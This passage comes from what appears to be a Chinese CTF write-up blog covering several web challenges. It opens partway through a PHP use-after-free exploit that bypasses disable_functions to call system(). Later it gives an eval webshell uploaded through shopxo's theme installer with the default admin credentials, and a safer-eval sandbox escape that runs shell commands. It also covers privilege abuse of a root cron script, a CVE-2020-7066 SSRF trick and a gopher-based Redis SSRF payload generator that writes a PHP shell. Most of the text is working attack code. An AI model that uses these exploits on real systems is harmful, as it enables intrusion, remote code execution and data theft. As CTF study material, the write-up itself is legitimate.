$p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:"ryat":2:&#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试了下好像只能在tmp上传php文件，传入后讲php文件引入index.php</p><h3 id="PHP-include-和-require-语句"><a href="#PHP-include-和-require-语句" class="headerlink" title="PHP include 和 require 语句"></a>PHP include 和 require 语句</h3><p><b>通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。</b></p><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?Ginkgo=QGV2YWwoJF9HRVRbYV0pOw==&amp;a=<span class="keyword">require</span>(<span class="string">'/tmp/exploit.php'</span>);</span><br><span class="line"><span class="keyword">include</span> 或 <span class="keyword">require</span>两种都行</span><br></pre></td></tr></table></figure><h2 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7066" target="_blank" rel="noopener">CVE-2020-7066</a></p><p id="div-border-left-blue">在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\ 0）字符，则URL将被静默地截断。这可能会导致某些软件对get_headers（）的目标做出错误的假设，并可能将某些信息发送到错误的服务器。</p><p>正常点击之后会这样跳转</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//</span>*<span class="string">.node3.buuoj.cn/</span>?url=http:<span class="string">//www.ctfhub.com</span></span><br></pre></td></tr></table></figure><p>发现Headers中存在Hint:Flag in localhost<br>试试localhost发现有个tips:Host must be end with ‘123’ ##主机名要是123结尾</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http:<span class="comment">//127.0.0.123%00www.ctfhub.com</span></span><br></pre></td></tr></table></figure><p><img src="/2.jpg"></p><h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>用的shopxo一款开源的企业级商城系统，基于thinkphp5框架开发。<br>一开始以为TP5的POC可以打，然后发现版本是1.80，几乎是最新版&#x3D; &#x3D;。好像都被修复了~<br><a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">shopxo后台全版本获取shell复现</a><br>利用后台上传shell来进行控制~</p><p><b>后台地址</b></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//</span>*<span class="string">.buuoj.cn/admin.php</span>?s=<span class="string">/admin/logininfo.html</span></span><br></pre></td></tr></table></figure><p>默认账号:admin,密码:shopxo.<br>登陆后进入到网站管理-&gt;主题管理-&gt;更多主题下载(下一个默认主题就行)</p><p>压入自己的webshell的php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[a]);</span><br><span class="line">    phpinfo(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/3.jpg" alt="压入shell.php"></p><p>主题安装中上传刚刚的zip<br><img src="/4.jpg"></p><p>访问一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;*.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;shell.php</span><br></pre></td></tr></table></figure><p>用蚁剑连一下</p><p>发现根目录下提示flag在&#x2F;root中<br>有一个auto.sh文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> (python /var/mail/makeflaghint.py &amp;) &amp;&amp; sleep 60; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>makeflaghint.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">gk1=str(time.ctime())</span><br><span class="line">gk=<span class="string">"\nGet The RooT,The Date Is Useful!"</span></span><br><span class="line">f=io.open(<span class="string">"/flag.hint"</span>, <span class="string">"rb+"</span>)</span><br><span class="line">f.write(str(gk1))</span><br><span class="line">f.write(str(gk))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>在终端ps -ef发现auto.sh是root权限的，所以py脚本应该可以读取root下的flag然后输出到flag.hint文件</p><p><img src="/5.jpg" alt="ps -ef"></p><p>读取下root下的文件目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.system(<span class="string">"whoami"</span>)</span><br><span class="line">f=io.open(<span class="string">"/flag.hint"</span>, <span class="string">"rb+"</span>)</span><br><span class="line"><span class="keyword">for</span> root,dirs,files <span class="keyword">in</span> os.walk(<span class="string">r"/root"</span>):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            f.write(os.path.join(root,file)+<span class="string">"\n"</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><img src="/7.jpg"></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">os</span></span><br><span class="line">import <span class="built_in">io</span></span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"><span class="built_in">os</span>.system(<span class="string">"whoami"</span>)</span><br><span class="line">f=<span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">"/flag.hint"</span>, <span class="string">"rb+"</span>)</span><br><span class="line">s=<span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">"/root/flag"</span>,<span class="string">"r"</span>).<span class="built_in">read</span>()</span><br><span class="line">f.<span class="built_in">write</span>(<span class="string">"chenzidu:"</span>+s)</span><br><span class="line">f.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><p><img src="/6.jpg"></p><h2 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a>EZ三剑客-EzNode</h2><p><a href="https://www.php.cn/js-tutorial-409538.html" target="_blank" rel="noopener">nodejs中express框架的中间件及app.use和app.get方法的解析</a><br>源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">'safer-eval'</span>); <span class="comment">// 2019.7/WORKER1 找到一个很棒的库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">'/eval'</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'timeout'</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">'Timeout!'</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/eval'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">'Wrong Wrong Wrong!!!!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br></pre></td></tr></table></figure><p>delay超出int(2147483637)导致异常，<br><a href="https://github.com/commenthol/safer-eval/issues/10" target="_blank" rel="noopener">safer-Eval的RCE</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> saferEval = <span class="built_in">require</span>(<span class="string">"./src/index"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> theFunction = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">"return process;"</span>)();</span><br><span class="line">  <span class="keyword">return</span> process.mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`(<span class="subst">$&#123;theFunction&#125;</span>)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(saferEval(untrusted));</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Url:</span><br><span class="line">    http:<span class="comment">//d9e03ffb-d362-49e6-80b0-a9280774354d.node3.buuoj.cn/eval?delay=2147483649</span></span><br><span class="line">post:</span><br><span class="line">    e=clearImmediate.constructor(<span class="string">"return process;"</span>)().mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"cat /flag"</span>).toString()</span><br><span class="line">或者</span><br><span class="line">post:</span><br><span class="line">    e=(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;<span class="keyword">const</span> process = clearImmediate.constructor(<span class="string">"return process;"</span>)();<span class="keyword">return</span> process.mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"cat /flag"</span>).toString()&#125;)()</span><br></pre></td></tr></table></figure><h2 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h2><p>F12提示<code>?secret</code>,访问一下发现能看到本机信息。考得是内网渗透，内网看看有啥不一样<br><img src="/8.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://f876b23b-c6a7-43a7-89dd-e44273e7dbf1.node3.buuoj.cn/index.php'</span></span><br><span class="line">num = len(requests.get(url,params=&#123;<span class="string">"url"</span>:<span class="string">"173.121.166.10"</span>,<span class="string">"submit"</span>:<span class="string">"提交"</span>&#125;).content)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">    res=requests.get(url,params=&#123;<span class="string">"url"</span>:<span class="string">"173.121.166."</span>+str(i),<span class="string">"submit"</span>:<span class="string">"提交"</span>&#125;)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure><p>发现173.121.166.11提醒了。</p><p><img src="/9.jpg"></p><p>brup扫下端口，6379是redis的端口。<br><a href="https://byqiyou.github.io/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">浅析Redis中SSRF的利用</a></p><p>拿里面的exp来生成payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.121.166.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php system('cat /flag');?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line"> <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line"> <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line"> <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line"> <span class="string">"save"</span></span><br><span class="line"> ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">CRLF=<span class="string">"\r\n"</span></span><br><span class="line">redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">cmd=<span class="string">""</span></span><br><span class="line">cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">cmd+=CRLF</span><br><span class="line"><span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">payload += urllib.quote(redis_format(x))</span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><p><img src="/10.jpg"></p><p><img src="/11.jpg"><br>提交之后直接访问<code>http://173.121.166.11/shell.php</code>可以拿到flag</p><p><img src="/12.jpg"></p><hr><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">disable_functions绕过</a><br><a href="https://www.w3school.com.cn/php/php_includes.asp" target="_blank" rel="noopener">PHP Include</a><br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7066" target="_blank" rel="noopener">CVE-2020-7066</a><br><a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">shopxo后台全版本获取shell复现</a><br><a href="https://blog.csdn.net/sinat_29957455/article/details/82778306?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159039411019724846436955%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159039411019724846436955&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-2-82778306.first_rank_v2_rank_v25&utm_term=python%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95" target="_blank" rel="noopener">python遍历目录下的所有文件和目录</a><br><a 